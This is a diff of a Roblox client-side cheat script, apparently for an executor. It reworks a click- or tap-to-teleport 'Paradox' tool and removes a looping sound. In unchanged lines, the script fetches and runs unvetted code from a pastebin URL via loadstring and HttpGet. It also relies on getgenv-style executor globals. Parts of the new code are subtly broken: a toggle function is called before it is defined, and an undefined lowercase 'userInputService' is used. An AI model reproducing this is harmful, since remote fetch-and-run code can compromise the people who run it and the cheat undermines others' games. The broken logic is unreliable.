@@ -1233,20 +1233,6 @@ if player then
     onPlayerAdded()
 end 
 
--- Place this script in a LocalScript within StarterPlayerScripts
-
--- Create a Sound object
-local sound = Instance.new("Sound")
-sound.SoundId = "rbxassetid://15689451063" -- Replace with your sound's Asset ID
-sound.Volume = 1 -- Adjust the volume
-sound.Looped = true -- Set to true if you want it to loop
-
--- Parent the sound to the local player’s PlayerGui
-sound.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
-
--- Play the sound
-sound:Play()
-
 loadstring(game:HttpGet('https://pastebin.com/raw/CvCuY7iC'))()
 
 coroutine.wrap(function()
@@ -1360,21 +1346,25 @@ getgenv().RArmCol = char['Right Arm'].ChildAdded:Connect(function(pp)
     end
 end)
 
-local isOn = false
-
 local tool = createTool("Paradox")
 
 local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
 local Workspace = game:GetService("Workspace")
+
 local player = Players.LocalPlayer
 local mouse = player:GetMouse()
-
 local camera = Workspace.CurrentCamera
+
+-- Script state variables
+local scriptActive = false -- To track if the script is active
+local teleportEnabled = false
+local mouseConnection
+local touchConnection
 
 -- Function to teleport the player
 local function teleportToPosition(position)
-    if isOn then
+    if not teleportEnabled then return end -- Ignore if teleportation is disabled
 
     local character = player.Character or player.CharacterAdded:Wait()
     local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
@@ -1382,45 +1372,67 @@ local function teleportToPosition(position)
     humanoidRootPart.CFrame = CFrame.new(position + Vector3.new(0, 3, 0)) -- Offset slightly above the ground
 end
 
-local function on()
-    if isPC then
-        mouse.Button1Down:Connect(function()
-            teleportToPosition(mouse.Hit.Position)
-        end)
+-- Function to stop the script
+local function stop()
+    if not scriptActive then return end -- Already stopped
+    teleportEnabled = false -- Disable teleportation
+
+    -- Disconnect existing connections
+    if mouseConnection then
+        mouseConnection:Disconnect()
+        mouseConnection = nil
     end
 
-    -- Touch tap for mobile
-    UserInputService.TouchTapInWorld:Connect(function(screenPosition, processed)
-        if processed then return end -- Ignore if UI processed the touch
+    if touchConnection then
+        touchConnection:Disconnect()
+        touchConnection = nil
+    end
 
-        -- Convert the screen position to a world position
+    print("Script stopped, teleportation disabled")
+end
+
+-- Function to activate the script
+local function teleportactivate()
+    if scriptActive then return end -- Already active
+    teleportEnabled = true -- Enable teleportation
+
+    -- Connect mouse input for PC
+    mouseConnection = mouse.Button1Down:Connect(function()
+        if teleportEnabled then
+            teleportToPosition(mouse.Hit.Position)
+        end
+    end)
+
+    -- Connect touch input for mobile
+    touchConnection = UserInputService.TouchTapInWorld:Connect(function(screenPosition, processed)
+        if not teleportEnabled or processed then return end -- Ignore if teleportation is disabled or UI processes touch
+
+        -- Convert 2D screen position to 3D world position
         local ray = camera:ScreenPointToRay(screenPosition.X, screenPosition.Y)
-        local rayDirection = ray.Direction * 1000 -- Extend the ray for a long distance 
+        local rayDirection = ray.Direction * 1000 -- Extend the ray far into the distance
         local raycastResult = Workspace:Raycast(ray.Origin, rayDirection)
 
         if raycastResult then
-            teleportToPosition(raycastResult.Position) -- Teleport to the raycast hit position
+            teleportToPosition(raycastResult.Position)
         end
     end)
+
+    print("Script activated, teleportation enabled")
 end
 
 local function onKeyPressed(input)
     if input.KeyCode == Enum.KeyCode.P then
-        toggleAbility()
+        toggleTool()
     end
 end
 
-local function off()
-   isOn = false
-end
-
-function toggleTool()
-    if not isOn then
-        on()
+local function toggleTool()
+    if not scriptActive then
+        teleportactivate()
     else
-        off()
+        stop()
     end
-    isOn = not isOn
+    scriptActive = not scriptActive
 end
 
 local function onToolActive()
@@ -1429,4 +1441,6 @@ end
 
 if isPC then
     userInputService.InputBegan:Connect(onKeyPressed)
+else
+    tool.Activated:Connect(onToolActive)
 end
